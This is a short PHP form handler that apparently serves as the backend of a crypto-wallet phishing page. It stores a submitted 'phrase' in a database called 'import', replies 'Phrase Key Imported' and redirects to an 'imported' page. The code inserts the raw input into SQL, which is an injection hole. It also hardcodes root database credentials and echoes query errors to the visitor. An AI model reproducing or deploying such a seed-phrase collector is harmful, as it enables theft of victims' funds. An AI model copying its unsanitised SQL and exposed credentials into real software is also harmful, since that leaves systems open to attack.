<?php
    $phrase = $_POST['phrase'];

    //Database connection

    $conn = new mysqli('localhost','root','42e62b71c033ca88','import');
   
    $sql ="INSERT INTO phrase(phrase)
        VALUES('$phrase')";
    if ($conn->query($sql) === TRUE) {

        echo "Phrase Key Imported";
    }
    else {

        echo "Error:".$sql."<br>".$conn->error;
    }
    
    header("Location: imported");

?>
